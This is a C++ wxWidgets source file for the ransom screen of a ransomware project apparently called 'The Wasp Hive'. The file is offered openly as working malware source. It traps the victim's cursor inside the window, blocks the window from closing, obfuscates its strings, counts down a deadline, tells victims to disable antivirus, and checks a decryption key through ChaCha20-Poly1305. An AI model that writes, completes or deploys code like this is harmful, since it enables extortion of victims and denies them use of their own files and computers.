// ============================================================================
// Screen2.cpp — The Wasp Hive Ransomware GUI (wxWidgets)
// ============================================================================
// Standalone wxWidgets binary. Compiled separately from the headless C2 bot.
//
// Features:
//   - Pixel-style countdown timer (4:00:36 → 0:00:00)
//   - Mouse constraint: cursor forced to stay within window
//   - ChaCha20-Poly1305 real decryption verification
//   - Warning icons with PNG fallback
//   - Window close prevention (must enter correct key)
// ============================================================================

#include <wx/wx.h>
#include <wx/statline.h>
#include <wx/timer.h>
#include <wx/filename.h>
#include <wx/stdpaths.h>
#include <wx/image.h>
#include <wx/imagpng.h>
#include <wx/textctrl.h>

// OBF() macro for compile-time string obfuscation
#include "obfuscation.h"

// Crypto functions for real ChaCha20-Poly1305 decrypt
#include "crypto.h"

#ifdef __APPLE__
#include <ApplicationServices/ApplicationServices.h>  // CGWarpMouseCursorPosition
#include <mach-o/dyld.h>  // _NSGetExecutablePath
#endif

// ============================================================================
// PIXEL DIGIT MATRICES (7×5)
// ============================================================================
class PixelDigit {
public:
    static const int digits[11][7][5];
};

const int PixelDigit::digits[11][7][5] = {
    {{0,1,1,1,0}, {1,1,0,1,1}, {1,1,0,1,1}, {1,1,0,1,1}, {1,1,0,1,1}, {1,1,0,1,1}, {0,1,1,1,0}},  // 0
    {{0,0,1,0,0}, {0,1,1,0,0}, {0,0,1,0,0}, {0,0,1,0,0}, {0,0,1,0,0}, {0,0,1,0,0}, {0,1,1,1,0}},  // 1
    {{0,1,1,1,0}, {1,1,0,1,1}, {0,0,0,1,1}, {0,0,1,1,0}, {0,1,1,0,0}, {1,1,0,0,0}, {1,1,1,1,1}},  // 2
    {{0,1,1,1,0}, {1,1,0,1,1}, {0,0,0,1,1}, {0,0,1,1,0}, {0,0,0,1,1}, {1,1,0,1,1}, {0,1,1,1,0}},  // 3
    {{0,0,1,1,0}, {0,1,1,1,0}, {1,1,0,1,1}, {1,1,0,1,1}, {1,1,1,1,1}, {0,0,0,1,1}, {0,0,0,1,1}},  // 4
    {{1,1,1,1,1}, {1,1,0,0,0}, {1,1,1,1,0}, {0,0,0,1,1}, {0,0,0,1,1}, {1,1,0,1,1}, {0,1,1,1,0}},  // 5
    {{0,1,1,1,0}, {1,1,0,1,1}, {1,1,0,0,0}, {1,1,1,1,0}, {1,1,0,1,1}, {1,1,0,1,1}, {0,1,1,1,0}},  // 6
    {{1,1,1,1,1}, {0,0,0,1,1}, {0,0,1,1,0}, {0,0,1,1,0}, {0,1,1,0,0}, {0,1,1,0,0}, {0,1,1,0,0}},  // 7
    {{0,1,1,1,0}, {1,1,0,1,1}, {1,1,0,1,1}, {0,1,1,1,0}, {1,1,0,1,1}, {1,1,0,1,1}, {0,1,1,1,0}},  // 8
    {{0,1,1,1,0}, {1,1,0,1,1}, {1,1,0,1,1}, {0,1,1,1,1}, {0,0,0,1,1}, {1,1,0,1,1}, {0,1,1,1,0}},  // 9
    {{0,0,0,0,0}, {0,0,1,1,0}, {0,0,1,1,0}, {0,0,0,0,0}, {0,0,1,1,0}, {0,0,1,1,0}, {0,0,0,0,0}}   // Colon (:)
};

// ============================================================================
// PIXEL TIMER PANEL — Retro-style countdown display
// ============================================================================
class PixelTimerPanel : public wxPanel {
private:
    int hours, minutes, seconds;
    wxColour pixelColor;
    int pixelSize;

public:
    PixelTimerPanel(wxWindow* parent, int h, int m, int s)
        : wxPanel(parent, wxID_ANY, wxDefaultPosition, wxSize(500, 80)),
          hours(h), minutes(m), seconds(s), pixelColor(255, 50, 50), pixelSize(6) {
        SetBackgroundColour(wxColour(0, 0, 0));
    }

    void SetTime(int h, int m, int s) {
        hours = h; minutes = m; seconds = s;
        Refresh();
    }

    void SetPixelColor(wxColour c) {
        pixelColor = c;
        Refresh();
    }

    void OnPaint(wxPaintEvent& event) {
        wxPaintDC dc(this);
        dc.SetBackground(wxBrush(wxColour(0, 0, 0)));
        dc.Clear();

        int timeDigits[6] = {hours/10, hours%10, minutes/10, minutes%10, seconds/10, seconds%10};
        int digitW = 5 * pixelSize;
        int colonW = 2 * pixelSize;
        int spacing = pixelSize;
        int groupSpace = pixelSize * 3;

        int totalW = (6 * digitW) + (2 * colonW) + (4 * spacing) + (2 * groupSpace);
        int x = (GetSize().GetWidth() - totalW) / 2;
        int y = 15;

        for (int i = 0; i < 6; i++) {
            DrawDigit(dc, x, y, timeDigits[i]);
            x += digitW + spacing;
            if (i == 1 || i == 3) {
                DrawDigit(dc, x, y, 10);
                x += colonW + groupSpace;
            }
        }
    }

    void DrawDigit(wxDC& dc, int x, int y, int d) {
        dc.SetBrush(wxBrush(pixelColor));
        dc.SetPen(wxPen(pixelColor));
        for (int row = 0; row < 7; row++) {
            for (int col = 0; col < 5; col++) {
                if (PixelDigit::digits[d][row][col] == 1) {
                    dc.DrawRectangle(x + col*pixelSize, y + row*pixelSize, pixelSize-1, pixelSize-1);
                }
            }
        }
    }

    wxDECLARE_EVENT_TABLE();
};

wxBEGIN_EVENT_TABLE(PixelTimerPanel, wxPanel)
    EVT_PAINT(PixelTimerPanel::OnPaint)
wxEND_EVENT_TABLE()

// ============================================================================
// WARNING ICON HELPER — Loads Warning-Icon.png from cwd or exe path
// ============================================================================
wxStaticBitmap* CreateWarningIcon(wxWindow* parent, int size = 24) {
    wxString path = wxGetCwd() + wxFileName::GetPathSeparator() + "Warning-Icon.png";
    if (!wxFileExists(path)) {
        path = wxFileName(wxStandardPaths::Get().GetExecutablePath()).GetPath() +
               wxFileName::GetPathSeparator() + "Warning-Icon.png";
    }
    if (wxFileExists(path)) {
        wxImage img(path, wxBITMAP_TYPE_PNG);
        if (img.IsOk()) {
            img.Rescale(size, size, wxIMAGE_QUALITY_HIGH);
            return new wxStaticBitmap(parent, wxID_ANY, wxBitmap(img));
        }
    }
    return nullptr;
}

// ============================================================================
// RANSOMEWARE FRAME — Main GUI Window
// ============================================================================
class RansomwareFrame : public wxFrame {
private:
    wxTimer* timer;              // Timer ID 1001: Countdown (1s)
    wxTimer* mouseTrackerTimer;  // Timer ID 1002: Mouse constraint (50ms)
    int hours, minutes, seconds;
    PixelTimerPanel* pixelTimerPanel;
    wxTextCtrl* passwordInput;
    bool canClose;  // Set to true only after successful decryption

    // ------------------------------------------------------------------
    // OnMouseTracker — Constrains cursor to stay within window bounds
    // Runs every 50ms via Timer ID 1002.
    // If the mouse moves outside the window, it gets warped back inside.
    // This prevents the victim from interacting with other windows.
    // ------------------------------------------------------------------
    void OnMouseTracker(wxTimerEvent& event) {
        wxPoint mousePos = wxGetMousePosition();

        // Get window bounds in screen coordinates
        wxPoint winPos = GetScreenPosition();
        wxSize winSize = GetSize();

        int winLeft   = winPos.x;
        int winRight  = winPos.x + winSize.x;
        int winTop    = winPos.y;
        int winBottom = winPos.y + winSize.y;

        // Check if mouse is outside the window
        bool outside = false;
        int newX = mousePos.x;
        int newY = mousePos.y;

        if (mousePos.x < winLeft) {
            newX = winLeft + 10;
            outside = true;
        } else if (mousePos.x > winRight) {
            newX = winRight - 10;
            outside = true;
        }

        if (mousePos.y < winTop) {
            newY = winTop + 10;
            outside = true;
        } else if (mousePos.y > winBottom) {
            newY = winBottom - 10;
            outside = true;
        }

        // Warp cursor back inside the window
        if (outside) {
#ifdef _WIN32
            SetCursorPos(newX, newY);
#elif defined(__APPLE__)
            CGPoint point = CGPointMake(newX, newY);
            CGWarpMouseCursorPosition(point);
#else
            // Linux: use wxWidgets WarpPointer
            WarpPointer(newX, newY);
#endif
        }
    }

public:
    RansomwareFrame()
        : wxFrame(nullptr, wxID_ANY, OBF("The Wasp Hive"),
                  wxDefaultPosition, wxSize(850, 650)),
          hours(4), minutes(0), seconds(36), canClose(false) {
        SetBackgroundColour(wxColour(0, 0, 0));
        SetMinSize(wxSize(800, 600));

        wxPanel* panel = new wxPanel(this);
        panel->SetBackgroundColour(wxColour(0, 0, 0));

        wxBoxSizer* mainSizer = new wxBoxSizer(wxVERTICAL);

        // ------------------------------------------------------------------
        // Logo (bee.png)
        // ------------------------------------------------------------------
        wxString beePath = wxGetCwd() + wxFileName::GetPathSeparator() + "bee.png";
        if (!wxFileExists(beePath)) {
            beePath = wxFileName(wxStandardPaths::Get().GetExecutablePath()).GetPath() +
                      wxFileName::GetPathSeparator() + "bee.png";
        }
        if (wxFileExists(beePath)) {
            wxImage img(beePath, wxBITMAP_TYPE_PNG);
            if (img.IsOk()) {
                img.Rescale(120, 120, wxIMAGE_QUALITY_HIGH);
                mainSizer->Add(new wxStaticBitmap(panel, wxID_ANY, wxBitmap(img)),
                              0, wxALIGN_CENTER | wxTOP | wxBOTTOM, 10);
            }
        }

        // ------------------------------------------------------------------
        // Title
        // ------------------------------------------------------------------
        wxStaticText* title = new wxStaticText(panel, wxID_ANY, OBF("THE WASP HIVE"));
        title->SetForegroundColour(wxColour(255, 215, 0));
        wxFont titleFont(36, wxFONTFAMILY_DEFAULT, wxFONTSTYLE_NORMAL, wxFONTWEIGHT_BOLD);
        title->SetFont(titleFont);
        mainSizer->Add(title, 0, wxALIGN_CENTER | wxBOTTOM, 15);

        // ------------------------------------------------------------------
        // Info panel (dark background)
        // ------------------------------------------------------------------
        wxPanel* infoPanel = new wxPanel(panel);
        infoPanel->SetBackgroundColour(wxColour(15, 15, 15));
        wxBoxSizer* infoSizer = new wxBoxSizer(wxVERTICAL);

        // Subtitle with warning icon
        wxBoxSizer* subSizer = new wxBoxSizer(wxHORIZONTAL);
        if (wxStaticBitmap* icon = CreateWarningIcon(infoPanel, 28)) {
            subSizer->Add(icon, 0, wxALIGN_CENTER_VERTICAL | wxRIGHT, 8);
        }
        wxStaticText* sub = new wxStaticText(infoPanel, wxID_ANY, OBF("What Happened to My Files?"));
        sub->SetForegroundColour(wxColour(255, 165, 0));
        sub->SetFont(wxFont(16, wxFONTFAMILY_DEFAULT, wxFONTSTYLE_NORMAL, wxFONTWEIGHT_BOLD));
        subSizer->Add(sub, 0, wxALIGN_CENTER_VERTICAL);
        infoSizer->Add(subSizer, 0, wxALL, 12);

        // Description text
        wxString desc = wxString(OBF("All important files on your system have been locked using military-grade AES-256 encryption. "))
                       + OBF("Your documents, photos, videos, databases, and other critical data are now inaccessible.\n\n")
                       + OBF("WASP HIVE ENCRYPTION SYSTEM:\n")
                       + OBF("Protected by industry-standard RSA-4096 asymmetric encryption. ")
                       + OBF("Your private decryption key is stored on our secure servers.\n\n");

        wxStaticText* descText = new wxStaticText(infoPanel, wxID_ANY, desc);
        descText->SetForegroundColour(wxColour(200, 200, 200));
        descText->SetFont(wxFont(11, wxFONTFAMILY_DEFAULT, wxFONTSTYLE_NORMAL, wxFONTWEIGHT_NORMAL));
        descText->Wrap(700);
        infoSizer->Add(descText, 0, wxLEFT | wxRIGHT | wxBOTTOM, 12);

        // Warnings section header
        wxBoxSizer* warnHeaderSizer = new wxBoxSizer(wxHORIZONTAL);
        if (wxStaticBitmap* warnIcon = CreateWarningIcon(infoPanel, 20)) {
            warnHeaderSizer->Add(warnIcon, 0, wxALIGN_CENTER_VERTICAL | wxRIGHT, 6);
        }
        wxStaticText* warnHeader = new wxStaticText(infoPanel, wxID_ANY, OBF("IMPORTANT WARNINGS:"));
        warnHeader->SetForegroundColour(wxColour(255, 100, 100));
        warnHeader->SetFont(wxFont(12, wxFONTFAMILY_DEFAULT, wxFONTSTYLE_NORMAL, wxFONTWEIGHT_BOLD));
        warnHeaderSizer->Add(warnHeader, 0, wxALIGN_CENTER_VERTICAL);
        infoSizer->Add(warnHeaderSizer, 0, wxLEFT | wxRIGHT | wxBOTTOM, 8);

        // Warning list
        wxString warnings[] = {
            OBF("DO NOT rename encrypted files - this may cause permanent data loss"),
            OBF("DO NOT use third-party decrypt tools - files may be corrupted"),
            OBF("Disable antivirus software - it may delete the decryptor"),
            OBF("System restore will NOT work - encryption is irreversible")
        };

        for (const wxString& w : warnings) {
            wxBoxSizer* wSizer = new wxBoxSizer(wxHORIZONTAL);
            wSizer->AddSpacer(20);
            if (wxStaticBitmap* icon = CreateWarningIcon(infoPanel, 14)) {
                wSizer->Add(icon, 0, wxALIGN_CENTER_VERTICAL | wxRIGHT, 6);
            }
            wxStaticText* wt = new wxStaticText(infoPanel, wxID_ANY, w);
            wt->SetForegroundColour(wxColour(180, 180, 180));
            wt->SetFont(wxFont(10, wxFONTFAMILY_DEFAULT, wxFONTSTYLE_NORMAL, wxFONTWEIGHT_NORMAL));
            wSizer->Add(wt, 0, wxALIGN_CENTER_VERTICAL);
            infoSizer->Add(wSizer, 0, wxLEFT | wxRIGHT | wxBOTTOM, 4);
        }

        infoPanel->SetSizer(infoSizer);
        mainSizer->Add(infoPanel, 0, wxEXPAND | wxLEFT | wxRIGHT, 30);

        mainSizer->AddSpacer(15);

        // ------------------------------------------------------------------
        // Pixel countdown timer
        // ------------------------------------------------------------------
        pixelTimerPanel = new PixelTimerPanel(panel, hours, minutes, seconds);
        mainSizer->Add(pixelTimerPanel, 0, wxALIGN_CENTER | wxBOTTOM, 15);

        // ------------------------------------------------------------------
        // Password section
        // ------------------------------------------------------------------
        wxBoxSizer* passSizer = new wxBoxSizer(wxHORIZONTAL);

        wxStaticText* passLabel = new wxStaticText(panel, wxID_ANY, OBF("ENTER DECRYPTION KEY:"));
        passLabel->SetForegroundColour(wxColour(255, 215, 0));
        passLabel->SetFont(wxFont(12, wxFONTFAMILY_DEFAULT, wxFONTSTYLE_NORMAL, wxFONTWEIGHT_BOLD));
        passSizer->Add(passLabel, 0, wxALIGN_CENTER_VERTICAL | wxRIGHT, 10);

        passwordInput = new wxTextCtrl(panel, wxID_ANY, "",
                                       wxDefaultPosition, wxSize(250, 30),
                                       wxTE_PASSWORD | wxTE_CENTER);
        passwordInput->SetBackgroundColour(wxColour(30, 30, 30));
        passwordInput->SetForegroundColour(wxColour(255, 215, 0));
        passwordInput->SetFont(wxFont(14, wxFONTFAMILY_MODERN, wxFONTSTYLE_NORMAL, wxFONTWEIGHT_BOLD));
        passSizer->Add(passwordInput, 0, wxALIGN_CENTER_VERTICAL | wxRIGHT, 10);

        wxButton* btn = new wxButton(panel, wxID_ANY, OBF("UNLOCK FILES"),
                                     wxDefaultPosition, wxSize(130, 30), wxBORDER_NONE);
        btn->SetBackgroundColour(wxColour(220, 50, 50));
        btn->SetForegroundColour(wxColour(255, 255, 255));
        btn->SetFont(wxFont(11, wxFONTFAMILY_DEFAULT, wxFONTSTYLE_NORMAL, wxFONTWEIGHT_BOLD));
        passSizer->Add(btn, 0, wxALIGN_CENTER_VERTICAL);

        mainSizer->Add(passSizer, 0, wxALIGN_CENTER | wxBOTTOM, 12);

        // ------------------------------------------------------------------
        // Bottom warning
        // ------------------------------------------------------------------
        wxBoxSizer* bottomWarnSizer = new wxBoxSizer(wxHORIZONTAL);
        if (wxStaticBitmap* icon = CreateWarningIcon(panel, 16)) {
            bottomWarnSizer->Add(icon, 0, wxALIGN_CENTER_VERTICAL | wxRIGHT, 6);
        }
        wxStaticText* bottomWarn = new wxStaticText(panel, wxID_ANY, OBF("WRONG KEY = PERMANENT DATA LOSS"));
        bottomWarn->SetForegroundColour(wxColour(255, 50, 50));
        bottomWarn->SetFont(wxFont(10, wxFONTFAMILY_DEFAULT, wxFONTSTYLE_NORMAL, wxFONTWEIGHT_BOLD));
        bottomWarnSizer->Add(bottomWarn, 0, wxALIGN_CENTER_VERTICAL);
        mainSizer->Add(bottomWarnSizer, 0, wxALIGN_CENTER | wxBOTTOM, 10);

        panel->SetSizer(mainSizer);

        // ------------------------------------------------------------------
        // TIMERS
        // ------------------------------------------------------------------
        // Timer ID 1001: Countdown (1 second interval)
        timer = new wxTimer(this, 1001);
        timer->Start(1000);
        Bind(wxEVT_TIMER, &RansomwareFrame::OnTimer, this, 1001);

        // Timer ID 1002: Mouse constraint (50ms interval)
        mouseTrackerTimer = new wxTimer(this, 1002);
        mouseTrackerTimer->Start(50);
        Bind(wxEVT_TIMER, &RansomwareFrame::OnMouseTracker, this, 1002);

        btn->Bind(wxEVT_BUTTON, &RansomwareFrame::OnUnlock, this);

        // Prevent window closing without correct key
        Bind(wxEVT_CLOSE_WINDOW, &RansomwareFrame::OnClose, this);

        Centre();
    }

    // ------------------------------------------------------------------
    // OnClose — Prevents closing until correct key is entered
    // ------------------------------------------------------------------
    void OnClose(wxCloseEvent& event) {
        if (!canClose) {
            wxMessageBox(OBF("YOUR FILES ARE ENCRYPTED!\n\nEnter the correct decryption key to unlock."),
                        OBF("\u26A0 CRITICAL WARNING \u26A0"), wxOK | wxICON_ERROR, this);
            event.Veto();
        } else {
            event.Skip();
        }
    }

    // ------------------------------------------------------------------
    // OnTimer — Countdown tick (Timer ID 1001)
    // ------------------------------------------------------------------
    void OnTimer(wxTimerEvent& event) {
        seconds--;
        if (seconds < 0) { seconds = 59; minutes--; }
        if (minutes < 0) { minutes = 59; hours--; }
        if (hours < 0) { hours = minutes = seconds = 0; timer->Stop(); }
        pixelTimerPanel->SetTime(hours, minutes, seconds);
    }

    // ------------------------------------------------------------------
    // OnUnlock — Verify decryption key via ChaCha20-Poly1305 MAC
    // ------------------------------------------------------------------
    void OnUnlock(wxCommandEvent& event) {
        wxString key = passwordInput->GetValue();
        if (key.IsEmpty()) {
            wxMessageBox(OBF("Enter decryption key!"), "Error", wxOK | wxICON_EXCLAMATION, this);
            return;
        }

        // Convert wxString to std::string
        std::string provided_key = std::string(key.mb_str());

        // Attempt real ChaCha20-Poly1305 decryption
        // decryptTargetFile reads the encrypted file, extracts nonce from header,
        // decrypts with provided key, and verifies Poly1305 MAC.
        // Returns true only if MAC verification passes (correct key).
        if (decryptTargetFile(provided_key)) {
            wxMessageBox(OBF("\u2713 DECRYPTION SUCCESSFUL!\n\nYour files have been restored."),
                        "Success", wxOK | wxICON_INFORMATION, this);
            canClose = true;
            Close(true);
        } else {
            wxMessageBox(OBF("\u2717 WRONG DECRYPTION KEY!\n\nYour files remain encrypted.\nTry again or contact support."),
                        OBF("Decryption Failed"), wxOK | wxICON_ERROR, this);
        }
    }

    ~RansomwareFrame() {
        if (timer) { timer->Stop(); delete timer; }
        if (mouseTrackerTimer) { mouseTrackerTimer->Stop(); delete mouseTrackerTimer; }
    }
};

// ============================================================================
// RANSOMEWARE APP — wxWidgets Application Entry Point
// ============================================================================
class RansomwareApp : public wxApp {
public:
    virtual bool OnInit() {
        wxInitAllImageHandlers();
        wxImage::AddHandler(new wxPNGHandler());
        (new RansomwareFrame())->Show(true);
        return true;
    }
};

wxIMPLEMENT_APP(RansomwareApp);
